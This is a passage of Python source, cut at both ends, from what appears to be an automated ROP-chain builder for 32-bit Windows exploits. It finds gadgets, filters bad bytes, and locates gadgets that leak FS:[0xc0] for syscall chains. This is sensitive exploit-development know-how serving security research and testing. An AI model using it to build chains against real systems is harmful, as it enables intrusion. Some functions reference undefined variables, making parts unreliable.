					fsReg= isRegOp1.group(1)
				if "esp" in fsReg:
					continue
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad      )
				if myDict[p].length ==1 and freeBad:
					# print ("found ",instruction, reg) 
					# print ("return 1")
					return True,p, stackPivotAmount,myDict[p].opcode,c2Amt, isRegOpOff, fsReg, offsetAdjust,skips,sysRemaining
			# print ("Return 2")
			return False,0,0,0,0,0,0,0,0,0,skips,sysRemaining
		if not length1: # was else
			for p in myDict:
				if p in skips:
					# print (cya,"continue in skips",res, p, hex(p))
					continue
				else:
					skips.add(p)
				# print ("checking", len(myDict),len(skips),sysRemaining)
				fsRegWhereExpected=False
				newRegFS=0
				if len(myDict)==len(skips) or len(skips)>=len(myDict):
					sysRemaining=False
					# print (cya,"sysRemaining set false2", res,len(myDict),len(skips),sysRemaining, instruction,red,reg,res)
					for any1 in myDict:
						if any1 not in skips:
							# print ("not in")
							# print (myDict)
							# print (skips)
							for ss in skips:
								# print (disOffset(ss), "instruction", instruction, reg)
								pass
							# exit()
				continueFlag=False
				offsetAdjust=0xc0
				out=disOffset(p)

				hasPop2=re.search(hasPop,out)
				hasDword2=re.search(hasDword,out)
				badReg2=re.search(badReg,out)
				if badReg2 or hasDword2:
					# print ("bad esp")
					continue
				# if not hasPop2:
				# 	# print ("\tspecial cut, no pop")
				# 	continue
				print (red,"   Candidate for gadget to leak FS:", res,out,yel,instruction, reg,res)
				# print (cya,"\t[ENTER]", res,"to accept.", cya, "n",res, "to discard.")
				
				# check=input()
				# if check =="n":
				# 	continue
				isRegOp1= re.search( isReg,out)
				isRegOpOff= re.search( isRegAndOffset,out)
				if isRegOpOff==None:
					isRegOpOff=False
				intOffsetComp=0xc0
				decOffsetComp=0
				if isRegOp1:
					fsReg= isRegOp1.group(1)
					# print ("isRegOp1, fsReg", fsReg)
				elif isRegOpOff:
					# print ("isRegAndOffset")
					myOffset=isRegOpOff.group(3)
					fsReg=isRegOpOff.group(1)
					offsetOperator=isRegOpOff.group(2)
					if offsetOperator=="-":
						offsetAdjust="+"
					elif offsetOperator=="+":
						offsetAdjust="-"
					offNewAdjust=offsetAdjust+myOffset
					try:
						intOffsetComp=int(offNewAdjust,16)
					except:
						intOffsetComp=int(offNewAdjust)
					# print (hex(intOffsetComp))
					decOffsetComp=-(intOffsetComp+0xc0)
					# print (hex(decOffsetComp))
					intOffsetComp=int2hex(intOffsetComp,32)
					intOffsetComp+=0xc0
					# print (gre,hex(intOffsetComp),res)
					# print ("myOffset", myOffset, "offsetOperator", offsetOperator)
				else:
					# print (red,"CONTINUE, not proper reg",res)
					continue
				checkRopTester()   
				if "esp" in fsReg:
					continue
				# print(mag,"candidate",res, p, hex(p), disOffset(p))
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				if not freeBad:
					# print ("bad checkfree", bad)
					# print(cya,"freebad continue",p,res)
					continue
				rC+=1
				# print ("intOffsetComp", hex(intOffsetComp))
				outEmObj,syscallValAtESP  =rop_testerFS(myDict[p].raw,fsReg, intOffsetComp, hex(p)+"  2")
				# print(gre)
				# outEmObj.show()
				# print(res)
				changed,changedDiff,changedRegs=outEmObj.giveChanged()
				# print ("fsReg",fsReg)
				fsRegWhereExpected,valHasMoved, movedFS= evaluateFSRegChanges(changedRegs,fsReg,0xaaaaaa,outEmObj)
				if instruction=="pushDwordFS":
					if fsRegWhereExpected:
						if not syscallValAtESP and not valHasMoved:
							continueFlag=True
				if not syscallValAtESP:
					if movedFS ==[] and not syscallValAtESP:
						# print ("not moved","syscallValAtESP",syscallValAtESP)
						if instruction=="pushDwordFS":
							continueFlag=True
					else:
						newRegFS=movedFS[0]
				if continueFlag:
					# print (red,"continueFlag1",res)
					continue
				checkedFree, stackPivotAmount= outEmObj.checkFreeTester(excludeRegs,[mReg,mWri])#,[newReg])
				# print ("stackPivotAmount", hex(stackPivotAmount))

				# if instruction=="pushDwordFS":
				# 	stackPivotAmount=stackPivotAmount-4
				# print ("stackPivotAmount",stackPivotAmount)
				# print ("fsRegWhereExpected",fsRegWhereExpected, "syscallValAtESP",syscallValAtESP, "movedFS", movedFS)
				if not checkedFree:
					# print(cya,"checkfree continue",hex(p), disOffset(p),res)
					continue
				# print (mag,"checkfreed esp", disOffset(p),res)
				c2Amt=calcC2Amount(p)

				if c2Amt!=0:
					modulo=c2Amt % 4
					if modulo!=0:
						continueFlag=True
				if continueFlag:
					# print (cya,"continueFlag",res)
					continue
				# print(hex(p),disOffset(p))
				newReg=None  ### maybe change later
				# print (mag,"\treturn true", hex(p), disOffset(p),res)
				# print ("Return 3, TRUE")
				return True, p, stackPivotAmount, isRegOpOff, fsReg, intOffsetComp, decOffsetComp, changedRegs,movedFS, newRegFS,syscallValAtESP, skips,sysRemaining


	# print (cya, "final sysgen false",instruction,reg,mReg, "sysRemaining", sysRemaining, 
	# print ("Return 4, FALSE")

	return False,0,0,0,0,0,0,0,0,0,0,skips,sysRemaining



def findGeneric(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
	# print ("findGeneric", instruction, reg)
	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		dp ("it exists")
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					# print ("found ",instruction, reg) 
					return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		dp ("it does not exist")
		# dp ("return false ", instruction)
		return False,0


def findGenericC2AgnosticJmpCall(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
	# print ("findGeneric", instruction, reg)
	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		dp ("it exists")
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
				if myDict[p].length ==1 and freeBad:
					# print ("found ",instruction, reg) 
					return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and freeBad:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		dp ("it does not exist")
		# dp ("return false ", instruction)
		return False,0
def findNegOrNot(reg,bad,length1, excludeRegs,espDesiredMovement, comment=None):
	# print ("findNegOrNot", reg)
	foundNe, ne1 = findGeneric("neg",reg,bad,length1, excludeRegs,espDesiredMovement)
	if foundNe:
		# print ("\t\tfound Neg1")

		cNe=chainObj(ne1, comment, [])
		return True, cNe
	dp ("\ttrying find not",reg)
	foundNo, no1 = findGeneric("notInst",reg,bad,length1, excludeRegs,espDesiredMovement)
	if foundNo:
		# print ("found Not")
		cNo=chainObj(no1, comment, [])
		foundNo, no1 = findGeneric("inc",reg,bad,length1, excludeRegs,espDesiredMovement)
		if foundNo:
			# print("got not")
			pass
		cIn=chainObj(no1, comment, [])
		cNoInc=pkBuild([cNo,cIn])

		return True, cNoInc

	return False,0

def calcAvailableFromExclude(excludeRegs):
	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for reg in excludeRegs:
		try:
			availableRegs.remove(reg)
		except:
			pass
	return availableRegs

def findNegOrNotTransfer(reg,bad,length1, excludeRegs,espDesiredMovement,omitEax=True,comment=None):
	dp ("findNegOrNotAny")
	# print (yel,"findNegOrNotTransfer excludes",res, excludeRegs)
	availableRegs=calcAvailableFromExclude(excludeRegs)
	# if omitEax and "eax" in availableRegs:
	# 	availableRegs.remove("eax")
	# print ("availableRegs", availableRegs)
	for r in availableRegs:
		foundNe, ne1 = findGeneric("neg",r,bad,length1, excludeRegs,espDesiredMovement)
		if foundNe:
			foundT, gT = findUniTransfer("1nn",r,reg, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r+" to " + reg +  " - " +comment)
			# print ("\t\tfound Neg2")
			if foundNe and foundT:
				cNe=chainObj(ne1, comment, [])
				pk=pkBuild([gT,cNe])
				return True, r, pk
		dp ("\ttrying find not",r)

	#TODO
	for r in availableRegs:
		foundNo, no1 = findGeneric("notInst",r,bad,length1, excludeRegs,espDesiredMovement)
		if foundNo:
			# print ("found Not")
			cNo=chainObj(no1, comment, [])
			foundNo, no1 = findGeneric("inc",r,bad,length1, excludeRegs,espDesiredMovement)
			if foundNo:
				# print("got not")
				pass
			cIn=chainObj(no1, comment, [])
			cNoInc=pkBuild([cNo,cIn])
			return True, r, cNoInc

	if "eax" in excludeRegs:
		for r in availableRegs:
			foundT0, gT0 = findUniTransfer("1nn",r,"eax", bad,length1,excludeRegs,espDesiredMovement, "Transfer " +"eax"+" to " + r +  " - " + " preserving eax, so we can do neg")
			foundT2, gT02 = findUniTransfer("1nn","eax",r, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r+" to " + "eax" +  " - " + " restoring eax, so we can do neg")
			if foundT0 and foundT2:
				excludeRegs2= copy.deepcopy(excludeRegs)
				excludeRegs2.append(r)
				availableRegs2= copy.deepcopy(availableRegs)
				availableRegs2.remove(r)
				for r2 in availableRegs2:
					foundNe, ne1 = findGeneric("neg",r2,bad,length1, excludeRegs2,espDesiredMovement)
					if foundNe:
						foundT, gT = findUniTransfer("1nn",r2,reg, bad,length1,excludeRegs2,espDesiredMovement, "Transfer " +r+" to " + reg +  " - " +comment)
						# print ("\t\tfound Neg2")
						if foundNe and foundT:
							cNe=chainObj(ne1, comment, [])
							pk=pkBuild([gT0, gT,cNe,gT02])
							# print("alt. findNegOrNotTransfer")
							# showChain(pk,True)
							return True, r2, pk



	return False,0,0

def findNegOrNotTransferSingle(reg,r,bad,length1, excludeRegs,espDesiredMovement, comment=None):
	dp ("findNegOrNotAny")

	availableRegs=calcAvailableFromExclude(excludeRegs)
	# for r in availableRegs:
	foundNe, ne1 = findGeneric("neg",r,bad,length1, excludeRegs,espDesiredMovement)
		
	if foundNe:
		foundT, gT = findUniTransfer("1nn",r,reg, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r+" to " + reg +  " - " +comment)

		print ("\t\tfound Neg")
		if foundNe and foundT:
			cNe=chainObj(ne1, comment, [])
			pk=pkBuild([gT,cNe])

			return True, r, pk
		dp ("\ttrying find not",r)

	# for r in availableRegs:
	foundNo, no1 = findGeneric("notInst",r,bad,length1, excludeRegs,espDesiredMovement)
	if foundNo:
		print ("found Not")
		cNo=chainObj(no1, comment, [])
		foundNo, no1 = findGeneric("inc",r,bad,length1, excludeRegs,espDesiredMovement)
		if foundNo:
			print("got not")
		cIn=chainObj(no1, comment, [])
		cNoInc=pkBuild([cNo,cIn])

		return True, r, cNoInc

	return False,0,0

def findZero(reg,bad,length1, excludeRegs,espDesiredMovement):
	foundX, x1 = findGeneric("xorZero",reg,bad,length1, excludeRegs,espDesiredMovement)
	if foundX:
		cZ=chainObj(x1, "XOR to get 0 in " + reg, [])
		return True, cZ

	foundP2, p2, chP = loadReg(reg,bad,length1,excludeRegs,0x00000000,"Set reg to Zero",False,"test")
	if foundP2:
		return True, chP
	##do less desirable forms here, e.g. XorZero+transfer

	return False,0

def findSetC0(reg,bad,length1, excludeRegs,espDesiredMovement):
	# foundX, x1 = findGeneric("xorZero",reg,bad,length1, excludeRegs,espDesiredMovement)
	# if foundX:
	# 	cZ=chainObj(x1, "XOR to get 0 in " + reg, [])
	# 	return True, cZ

	foundP2, p2, chP = loadReg(reg,bad,length1,excludeRegs,0x000000c0,"Set to 0xc0",False,"test")
	if foundP2:
		return True, chP
	##do less desirable forms here, e.g. XorZero+transfer

	return False,0

def compRegAddVal(reg1,val, bad,length1,excludeRegs,espDesiredMovement,comment):
	# print ("compRegAddVal excludeRegs",excludeRegs)
	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	instruction ="add"
	excludeRegs=set(excludeRegs)
	bExists, myDict=fg.getFg(instruction,reg1)
	hexaPattern = re.compile(r'(0x[0-9a-fA-F]+)|[0-9]+')
	isReg= re.compile( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p', re.M|re.I)
	# diffPR=  int2hex(diffPR,32)
	foundAddReg=False
	addReg=0
	t=0
	if val <0:
		# print ("less than zero, let's do two's complement")
		val=  int2hex(val,32)

	if bExists and length1:	
		for p in myDict:
			continueFlag=True
			continueFlag2=False
			foundP2=False
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
			isRegOp1= re.search( isReg,myDict[p].op1)
			isRegOp2= re.search( isReg,myDict[p].op2)
			if myDict[p].length ==1 and freeBad and isRegOp1 and isRegOp2 and myDict[p].op2!=myDict[p].op1 and myDict[p].op1 == reg1:
				# print (gre,"found ",disOffset(p), hex(p), reg1,res, hex(t)) 
				foundAddReg =True
				addReg=p
				reg2=myDict[p].op2
				if foundAddReg :
					excludeRegs2= copy.deepcopy(excludeRegs)
					excludeRegs2.add(reg1)
					print ("foundAddReg", disOffset(addReg),hex(addReg), hex(t))
					foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs2,val," - this value is intended to compensate for an irregular change in the the reg that FS:[0xc0] was leaked to. This may need to be adjusted.",False,"test")
					if foundP2:
						print ("found load Reg")
						pass
						break
	if foundAddReg and foundP2:
		pk=pkBuild([chP,addReg])
		# print(yel)
		showChain(pk,True)
		# print(res)
		return True, pk
	return False,0

def addByC0(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment):
	# print ("addByC0 excludeRegs",excludeRegs)
	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	instruction ="add"
	excludeRegs=set(excludeRegs)

	bExists, myDict=fg.getFg(instruction,reg1)
	hexaPattern = re.compile(r'(0x[0-9a-fA-F]+)|[0-9]+')
	isReg= re.compile( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p', re.M|re.I)

	# diffPR=  int2hex(diffPR,32)

	foundAddReg=False
	addReg=0
	t=0
	if bExists and length1:	
		for p in myDict:
			
			continueFlag=True
			continueFlag2=False
			# if continueFlag2:
			# 	break
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
			isRegOp1= re.search( isReg,myDict[p].op1)
			isRegOp2= re.search( isReg,myDict[p].op2)


			if myDict[p].length ==1 and freeBad and isRegOp1 and isRegOp2 and myDict[p].op2!=myDict[p].op1 and myDict[p].op1 == reg1 and myDict[p].op2 ==reg2:
				# print (gre,"found ",disOffset(p), hex(p), reg1,res, hex(t)) 
				foundAddReg =True
				addReg=p
				break
			t+=1
			# print ("did not find")

	if foundAddReg :
		# print ("foundAddReg", disOffset(addReg),hex(addReg), hex(t))
		foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,0xc0,comment,False,"test")
		if foundP2:
			# print ("found load Reg")
			pass

	if foundAddReg and foundP2:
		pk=pkBuild([chP,addReg])
		# print(yel)
		# showChain(pk,True)
		print(res)
		return True, pk
	

	return False,0

def subByC0(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment):
	# print ("subByC0 excludeRegs",excludeRegs)
	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
	for d in excludeRegs:
		try:
			availableRegs.remove(d)
		except:
			pass
	instruction ="add"
	excludeRegs=set(excludeRegs)

	bExists, myDict=fg.getFg(instruction,reg1)
	hexaPattern = re.compile(r'(0x[0-9a-fA-F]+)|[0-9]+')
	isReg= re.compile( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p', re.M|re.I)
	foundAddReg=False
	addReg=0
	t=0
	# print ("reg1", reg1)
	if bExists and length1:	
		for p in myDict:
			
			continueFlag=True
			continueFlag2=False
			# if continueFlag2:
			# 	break
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
			isRegOp1= re.search( isReg,myDict[p].op1)
			isRegOp2= re.search( isReg,myDict[p].op2)
			if myDict[p].length ==1 and freeBad and isRegOp1 and isRegOp2 and myDict[p].op2!=myDict[p].op1 and myDict[p].op1 == reg1 and myDict[p].op2 ==reg2:
				# print (gre,"found ",disOffset(p), hex(p), reg1,res, hex(t)) 
				foundAddReg =True
				addReg=p
				break
			t+=1
	if foundAddReg :
		# print ("foundAddReg", disOffset(addReg),hex(addReg), hex(t))
		### adding - 0xc0 compensatory for 0xc0 for sameRegs
		foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,0xFFFFFF40,comment,False,"test")
		if foundP2:
			# print ("found load Reg -0xc0")
			pass
	if foundAddReg and foundP2:
		pk=pkBuild([chP,addReg])
		# print(yel)
		# showChain(pk,True)
		# print(res)
		return True, pk
	

	return False,0

def isReg32(val):
	val=val.lower()
	if re.match( r'^e[abcdsb]+[xspi]+', val, re.M|re.I):
		return True
	return False

def findXorLoadValAny(reg,val,bad,length1, excludeRegs,espDesiredMovement=0):
	# print("findXorLoadVal", reg)
	instruction="xor"
	num=0

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for r1 in excludeRegs:
		availableRegs.remove(r1)
		
	reg2=0

	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for reg2 in availableRegs:
				for p in myDict:
					# print ("    checking  REG",reg,cya,disOffset(p),res)
					freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

					# print("just checking: op1",myDict[p].op1, "op2", myDict[p].op2, isReg32(myDict[p].op1),"\n\t", disOffset(p)) 
					if myDict[p].length ==1  and freeBad and isReg32(myDict[p].op1) and myDict[p].op2==reg2:


						foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,val,"Do XOR",False,"test")
						if not foundP2:
							continue
						dp ("found ",instruction, reg)
						# print ("found", disOffset(p))
						pk=pkBuild([chP,p])
						return True, pk,reg2 
	return False, 0,0



def findXorOffset(reg,bad,length1, excludeRegs,espDesiredMovement=0):
	# print("findXorOffset", reg)
	instruction="xor"
	num=0

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	for r1 in excludeRegs:
		availableRegs.remove(r1)
		
	
	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				# print ("    checking  REG",reg,cya,disOffset(p),res)
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				# print("just checking: op1",myDict[p].op1, "op2", myDict[p].op2, isReg32(myDict[p].op1),"\n\t", disOffset(p)) 
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and isReg32(myDict[p].op1):
					try: 
						num=int(myDict[p].op2,16)
					except:
						try:
							num=int(myDict[p].op2)
						except:
							continue
					dp ("found ",instruction, reg)
					# print ("found", disOffset(p))
					return True, p, num,reg
		
	return False, 0,0,reg

def findXchg(op2, reg,bad,length1, excludeRegs,espDesiredMovement=0):
	dp ("xchg", reg, op2)
	instruction="xchg"
	bExists, myDict=fg.getFg(instruction,reg)
	# bExistsOp2, myDict=fg.getFg(instruction,op2)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and ((myDict[p].op2==op2 and myDict[p].op1==reg ) or (myDict[p].op1==op2 and myDict[p].op2==reg )):
					dp ("found ",instruction, reg)
					return True,p
			dp ("findXchg returning False" )
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op2==op2:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and myDict[p].op2==op2:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		# dp ("return false ", instruction)
		return False,0

#foundAdd, a1 = findGenericOp1Op2("add", op1, op2, reg,bad,length1, excludeRegs,espDesiredMovement)

def findGenericOp1Op2(instruction, op2, reg,bad,length1, excludeRegs,espDesiredMovement=0,isVal=False):
	dp ("instruction", instruction, "reg", reg)
	dp ("findGeneric", instruction+reg)
	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op1==op1 and myDict[p].op2==op2:
					dp ("found ",instruction, reg)
					return True,p
			dp ("findGeneric returning False" )
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)
				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op1==op1 and myDict[p].op2==op2:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and myDict[p].op2==op2:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		# dp ("return false ", instruction)
		return False,0

def findGenericOp2(instruction, op2, reg,bad,length1, excludeRegs,espDesiredMovement=0,isVal=False):
	dp ("instruction", instruction, "reg", reg)
	dp ("findGeneric", instruction+reg)
	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				# if op2=="edi" and reg=="esi" and myDict[p].length ==1:
				# 	print (yel,disOffset(p), res,"\t", reg, op2, myDict[p].op1, myDict[p].op2, myDict[p].opcode)
				tellWhy=False
				# if instruction=="add":
				# 	tellWhy=True
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal,tellWhy)
				# out=disOffset(p)
				# if instruction=="add" and myDict[p].length==1 and (reg in out) and op2 in out :
				# 	print ("\t\t",disOffset(p), "freeBad", freeBad, "myDict[p].length",myDict[p].length, "myDict[p].op2",myDict[p].op2)
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op2==op2:
					# print (cya,"found ",p, disOffset(p), instruction, reg, res)
					return True,p
			dp ("findGeneric2 returning False" )
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op2==op2:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and myDict[p].op2==op2:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		# dp ("return false ", instruction)
		return False,0

def findGeneric64(instruction,fgReg,reg,bad,length1, excludeRegs,espDesiredMovement=0,isVal=False):
	dp ("findGeneric64", instruction, reg)
	bExists, myDict=fg.getFg(instruction,fgReg)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found ",instruction, reg) 
					return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		# dp ("return false ", instruction)
		return False,0

def findGenericOp264(instruction,fgReg, op2, reg,bad,length1, excludeRegs,espDesiredMovement=0,isVal=False):
	dp ("instruction", instruction, "reg", reg, "op2", op2)
	dp ("findGeneric", instruction+reg)
	bExists, myDict=fg.getFg(instruction,fgReg)
	if bExists:
		# dp ("It exists")
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				# dp ("here", myDict[p].length, myDict[p].op2)
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op2==op2:
					dp ("found ",instruction, reg)
					return True,p
			dp ("findGeneric2 returning False" )
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and myDict[p].op2==op2:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and myDict[p].op2==op2:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		dp ("it does not exist")
		dp ("return false ", instruction)
		return False,0
def findMovEsp(reg,bad,length1, excludeRegs,espDesiredMovement=0):
	dp ("findMovEsp:", reg, length1)
	bExists, myDict=fg.getFg("mov",reg)
	if bExists:
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2=="esp":
					dp ("found findMovEsp", reg)
					return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2=="esp":
					dp ("found findMovEsp", reg)
					return True,p, myDict
				dp ("findMovEsp clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree(("mov",reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist and fg.rop[p].op2=="esp":
					dp ("found findMovEsp alt", reg)
					return True,m1
				else:
					return False,0
	else:
		# dp ("return false findmovderef")
		return False,0

def findMovDeref(reg,op2,bad,length1, excludeRegs, bothForms=True):
	global rC
	dp ("findMovDeref:", reg, length1)
	# print ("findMovDeref", reg, op2)
	bExists, myDict=fg.getFg("movDword",reg)
	if not bothForms:
		isRegDeref= re.compile( r'mov dword ptr \[[eaxbcdispb]+\]', re.M|re.I)
	else:
		isRegDeref= re.compile( r'mov dword ptr \[[eaxbcdispb]+\]|mov dword ptr \[[eaxbcdispb]+ \+ [1-9af]+]', re.M|re.I)
	if bExists:
		dp ("findMovDeref exists")
		# length1=False
		# length1=False
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				# print (disOffset((p)))
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2==op2:
					out=disOffset(p)
					# if reg=="eax" and op2=="ecx":
						# print (out)
					if re.search(isRegDeref, out):
						# print (gre,"got one", out,res)
						return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				checkRopTester()
				out=disOffset(p)
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
				if myDict[p].length > 1 and freeBad and fg.rop[p].op2==op2:
					out=disOffset(p)
					if re.search(isRegDeref, out) and "leave" not in out:
